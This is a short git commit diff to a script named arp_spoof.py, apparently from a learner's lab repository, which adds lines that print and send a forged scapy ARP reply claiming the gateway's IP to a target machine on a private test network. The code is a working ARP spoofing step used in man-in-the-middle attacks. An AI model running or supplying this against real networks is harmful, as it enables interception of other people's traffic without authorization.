abde0099c85f0c62ca537113221b1f3e7e647259
jean_kali <jeanandrewfuentes@gmail.com>
2020-02-29 04:44:52 -0500

    Sending ARP Responses

--- arp_spoof.py
+++ arp_spoof.py
@@ -7,3 +7,6 @@ target_mac="08:00:27:31:de:a3"
 gateway_ip = "10.0.2.1"
 
 packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip )
+print(packet.show())
+print(packet.summary())
+scapy.send(packet)
